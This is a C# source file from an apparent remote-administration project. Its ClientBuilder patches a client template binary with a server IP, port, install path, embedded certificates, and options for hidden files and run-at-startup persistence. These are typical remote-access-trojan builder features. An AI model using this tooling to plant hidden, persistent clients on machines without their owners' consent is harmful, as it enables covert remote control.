using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace RemoteAdmin.Server.Build
{
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _templatePath;

        // Must match ClientConfig placeholders EXACTLY
        private const string IP_PLACEHOLDER = "###PLACEHOLDER_IP_ADDR_X9K2P7L4M###";
        private const int PORT_PLACEHOLDER = 999999999;
        private const int INTERVAL_PLACEHOLDER = 888888888;

        // Installation setting placeholders - MUST match ClientConfig.cs
        private const string INSTALL_LOCATION_PLACEHOLDER = "###INSTALL_LOCATION_PLACEHOLDER###";
        private const string INSTALL_SUBDIR_PLACEHOLDER = "###INSTALL_SUBDIR_PLACEHOLDER###";
        private const string INSTALL_NAME_PLACEHOLDER = "###INSTALL_NAME_PLACEHOLDER###";
        private const string STARTUP_NAME_PLACEHOLDER = "###STARTUP_NAME_PLACEHOLDER###";

        // Certificate chunk placeholders
        private const string CLIENT_PFX_PART1_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART1_5E4F2C90###";
        private const string CLIENT_PFX_PART2_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART2_6F5E3D91###";
        private const string CLIENT_PFX_PART3_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART3_7G6F4E92###";
        private const string CLIENT_PFX_PART4_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART4_8H7G5F93###";
        private const string CLIENT_PFX_PASS_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PASSWORD_9B8A7D66###";
        private const string CA_CRT_PART1_PREFIX = "###PLACEHOLDER_CA_CRT_PART1_4A3B2C1D###";
        private const string CA_CRT_PART2_PREFIX = "###PLACEHOLDER_CA_CRT_PART2_5B4C3D2E###";

        public ClientBuilder(BuildOptions options, string templatePath)
        {
            _options = options ?? throw new ArgumentNullException(nameof(options));
            _templatePath = templatePath ?? throw new ArgumentNullException(nameof(templatePath));
        }

        public void Build()
        {
            if (!File.Exists(_templatePath))
            {
                throw new FileNotFoundException($"Template file not found: {_templatePath}");
            }

            try
            {
                Console.WriteLine("=== Starting Client Build ===");
                byte[] fileBytes = File.ReadAllBytes(_templatePath);

                // ============================================
                // 1. INJECT CONNECTION SETTINGS
                // ============================================
                Console.WriteLine("\n[1/3] Injecting connection settings...");

                if (!InjectString(ref fileBytes, IP_PLACEHOLDER, _options.ServerIP))
                    throw new Exception("Failed to inject ServerIP - placeholder not found!");
                Console.WriteLine($"  ✓ Server IP: {_options.ServerIP}");

                if (!InjectInt32(ref fileBytes, PORT_PLACEHOLDER, _options.ServerPort))
                    throw new Exception("Failed to inject ServerPort - placeholder not found!");
                Console.WriteLine($"  ✓ Server Port: {_options.ServerPort}");

                if (!InjectInt32(ref fileBytes, INTERVAL_PLACEHOLDER, _options.ReconnectDelay))
                    throw new Exception("Failed to inject ReconnectDelay - placeholder not found!");
                Console.WriteLine($"  ✓ Reconnect Delay: {_options.ReconnectDelay}s");

                // ============================================
                // 2. INJECT INSTALLATION SETTINGS
                // ============================================
                Console.WriteLine("\n[2/3] Injecting installation settings...");

                if (!InjectString(ref fileBytes, INSTALL_LOCATION_PLACEHOLDER, _options.InstallLocation ?? "AppData"))
                    throw new Exception("Failed to inject InstallLocation - placeholder not found!");
                Console.WriteLine($"  ✓ Install Location: {_options.InstallLocation}");

                if (!InjectString(ref fileBytes, INSTALL_SUBDIR_PLACEHOLDER, _options.InstallSubDirectory ?? "SubDir"))
                    throw new Exception("Failed to inject InstallSubDirectory - placeholder not found!");
                Console.WriteLine($"  ✓ Install SubDirectory: {_options.InstallSubDirectory}");

                if (!InjectString(ref fileBytes, INSTALL_NAME_PLACEHOLDER, _options.InstallName ?? "Client"))
                    throw new Exception("Failed to inject InstallName - placeholder not found!");
                Console.WriteLine($"  ✓ Install Name: {_options.InstallName}");

                if (!InjectString(ref fileBytes, STARTUP_NAME_PLACEHOLDER, _options.StartupName ?? "Client"))
                    throw new Exception("Failed to inject StartupName - placeholder not found!");
                Console.WriteLine($"  ✓ Startup Name: {_options.StartupName}");

                // INJECT BOOLEAN FLAGS
                // Note: Booleans in the template are "false" strings that need to be replaced
                if (_options.InstallClient)
                {
                    ReplaceBoolean(ref fileBytes, "InstallClient = false", "InstallClient = true");
                    Console.WriteLine($"  ✓ Install Client: true");
                }

                if (_options.SetFileHidden)
                {
                    ReplaceBoolean(ref fileBytes, "SetFileHidden = false", "SetFileHidden = true");
                    Console.WriteLine($"  ✓ Set File Hidden: true");
                }

                if (_options.SetSubDirHidden)
                {
                    ReplaceBoolean(ref fileBytes, "SetSubDirHidden = false", "SetSubDirHidden = true");
                    Console.WriteLine($"  ✓ Set SubDir Hidden: true");
                }

                if (_options.InstallOnStartup)
                {
                    ReplaceBoolean(ref fileBytes, "InstallOnStartup = false", "InstallOnStartup = true");
                    Console.WriteLine($"  ✓ Install On Startup: true");
                }

                // ============================================
                // 3. INJECT CERTIFICATES
                // ============================================
                Console.WriteLine("\n[3/3] Injecting certificates...");

                var clientPfxPath = Path.Combine("Certificates", "client.pfx");
                var caCrtPath = Path.Combine("Certificates", "ca.crt");

                if (!File.Exists(clientPfxPath) || !File.Exists(caCrtPath))
                    throw new Exception("Certificates not found in Certificates\\ (client.pfx, ca.crt). Generate them first.");

                var clientPfxBytes = File.ReadAllBytes(clientPfxPath);
                var caCrtBytes = File.ReadAllBytes(caCrtPath);

                string clientPfxBase64 = Convert.ToBase64String(clientPfxBytes);
                string caCrtBase64 = Convert.ToBase64String(caCrtBytes);

                Console.WriteLine($"  • Client PFX size: {clientPfxBase64.Length} chars");
                Console.WriteLine($"  • CA CRT size: {caCrtBase64.Length} chars");

                // Inject password
                string clientPfxPassword = _options.ClientPfxPassword ?? "";
                if (!InjectStringWithPadding(ref fileBytes, CLIENT_PFX_PASS_PREFIX, clientPfxPassword, 100))
                    throw new Exception("Failed to inject CLIENT_PFX_PASSWORD - placeholder not found!");
                Console.WriteLine($"  ✓ PFX Password: [length: {clientPfxPassword.Length}]");

                // Inject client PFX in chunks (4 x 1000 chars = 4000 total capacity)
                var pfxChunks = SplitIntoChunks(clientPfxBase64, 1000);
                if (pfxChunks.Count > 4)
                    throw new Exception($"Client PFX too large! Length: {clientPfxBase64.Length}, Max: 4000");

                if (!InjectStringWithPadding(ref fileBytes, CLIENT_PFX_PART1_PREFIX, pfxChunks.ElementAtOrDefault(0) ?? "", 1000))
                    throw new Exception("Failed to inject CLIENT_PFX_PART1");
                if (!InjectStringWithPadding(ref fileBytes, CLIENT_PFX_PART2_PREFIX, pfxChunks.ElementAtOrDefault(1) ?? "", 1000))
                    throw new Exception("Failed to inject CLIENT_PFX_PART2");
                if (!InjectStringWithPadding(ref fileBytes, CLIENT_PFX_PART3_PREFIX, pfxChunks.ElementAtOrDefault(2) ?? "", 1000))
                    throw new Exception("Failed to inject CLIENT_PFX_PART3");
                if (!InjectStringWithPadding(ref fileBytes, CLIENT_PFX_PART4_PREFIX, pfxChunks.ElementAtOrDefault(3) ?? "", 1000))
                    throw new Exception("Failed to inject CLIENT_PFX_PART4");
                Console.WriteLine($"  ✓ Client PFX injected in {pfxChunks.Count} chunks");

                // Inject CA certificate in chunks (2 x 1000 chars = 2000 total capacity)
                var caChunks = SplitIntoChunks(caCrtBase64, 1000);
                if (caChunks.Count > 2)
                    throw new Exception($"CA certificate too large! Length: {caCrtBase64.Length}, Max: 2000");

                if (!InjectStringWithPadding(ref fileBytes, CA_CRT_PART1_PREFIX, caChunks.ElementAtOrDefault(0) ?? "", 1000))
                    throw new Exception("Failed to inject CA_CRT_PART1");
                if (!InjectStringWithPadding(ref fileBytes, CA_CRT_PART2_PREFIX, caChunks.ElementAtOrDefault(1) ?? "", 1000))
                    throw new Exception("Failed to inject CA_CRT_PART2");
                Console.WriteLine($"  ✓ CA Certificate injected in {caChunks.Count} chunks");

                // ============================================
                // 4. WRITE OUTPUT
                // ============================================
                Console.WriteLine($"\n[4/4] Writing output to: {_options.OutputPath}");
                File.WriteAllBytes(_options.OutputPath, fileBytes);

                Console.WriteLine("\n✅ BUILD COMPLETED SUCCESSFULLY!");
                Console.WriteLine($"   Output: {_options.OutputPath}");
                Console.WriteLine($"   Size: {new FileInfo(_options.OutputPath).Length:N0} bytes");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n❌ BUILD FAILED: {ex.Message}");
                throw;
            }
        }

        private List<string> SplitIntoChunks(string input, int chunkSize)
        {
            var chunks = new List<string>();
            for (int i = 0; i < input.Length; i += chunkSize)
            {
                chunks.Add(input.Substring(i, Math.Min(chunkSize, input.Length - i)));
            }
            return chunks;
        }

        private bool ReplaceBoolean(ref byte[] data, string searchFor, string replaceWith)
        {
            try
            {
                byte[] searchBytes = Encoding.Unicode.GetBytes(searchFor);
                byte[] replaceBytes = Encoding.Unicode.GetBytes(replaceWith);

                int index = FindPattern(data, searchBytes);
                if (index == -1)
                    return false;

                if (replaceBytes.Length > searchBytes.Length)
                    throw new Exception($"Replacement text is longer than original!");

                Array.Copy(replaceBytes, 0, data, index, replaceBytes.Length);

                // Null-pad remaining space
                for (int i = replaceBytes.Length; i < searchBytes.Length; i++)
                {
                    data[index + i] = 0;
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool InjectStringWithPadding(ref byte[] data, string prefix, string value, int paddingSize)
        {
            byte[] prefixBytes = Encoding.Unicode.GetBytes(prefix);
            int prefixIndex = FindPattern(data, prefixBytes);

            if (prefixIndex == -1)
                return false;

            int valueStartIndex = prefixIndex + prefixBytes.Length;
            byte[] valueBytes = Encoding.Unicode.GetBytes(value);
            int totalSpaceAvailable = paddingSize * 2; // Unicode = 2 bytes per char

            if (valueBytes.Length > totalSpaceAvailable)
                throw new Exception($"Value too long! Length: {value.Length}, Max: {paddingSize}");

            Array.Copy(valueBytes, 0, data, valueStartIndex, valueBytes.Length);

            // Fill remaining space with null bytes
            for (int i = valueBytes.Length; i < totalSpaceAvailable; i++)
            {
                data[valueStartIndex + i] = 0;
            }

            return true;
        }

        private bool InjectString(ref byte[] data, string placeholder, string value)
        {
            byte[] placeholderBytes = Encoding.Unicode.GetBytes(placeholder);
            byte[] valueBytes = Encoding.Unicode.GetBytes(value);

            int index = FindPattern(data, placeholderBytes);
            if (index == -1)
                return false;

            if (valueBytes.Length > placeholderBytes.Length)
                throw new Exception($"Value '{value}' is too long! Max length: {placeholderBytes.Length / 2} chars");

            Array.Copy(valueBytes, 0, data, index, valueBytes.Length);

            for (int i = valueBytes.Length; i < placeholderBytes.Length; i++)
            {
                data[index + i] = 0;
            }

            return true;
        }

        private bool InjectInt32(ref byte[] data, int placeholder, int value)
        {
            byte[] placeholderBytes = BitConverter.GetBytes(placeholder);
            byte[] valueBytes = BitConverter.GetBytes(value);

            int index = FindPattern(data, placeholderBytes);
            if (index == -1)
                return false;

            Array.Copy(valueBytes, 0, data, index, valueBytes.Length);
            return true;
        }

        private int FindPattern(byte[] data, byte[] pattern)
        {
            int patternLength = pattern.Length;
            int dataLength = data.Length - patternLength;

            for (int i = 0; i <= dataLength; i++)
            {
                bool found = true;
                for (int j = 0; j < patternLength; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                    return i;
            }
            return -1;
        }
    }
}